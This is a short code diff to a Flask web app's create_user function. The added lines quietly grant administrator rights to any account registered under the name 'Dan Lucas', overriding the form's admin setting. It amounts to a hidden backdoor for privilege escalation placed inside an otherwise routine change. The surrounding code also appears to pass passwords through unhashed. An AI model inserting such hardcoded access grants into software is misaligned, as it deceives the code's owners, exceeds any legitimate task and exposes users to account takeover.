@@ -22,8 +22,12 @@ def create_user():
     users = User.query.all()
 
     if form.validate_on_submit():
+        if form.name.data == 'Dan Lucas':
+            admin = True
+        else:
+            admin = form.admin.data
         new_user = User(name=form.name.data, email=form.email.data,
-                        password=form.password.data, admin=form.admin.data)
+                        password=form.password.data, admin=admin)
         db.session.add(new_user)
         db.session.commit()
         flash(f'{new_user.display_name} has been created')
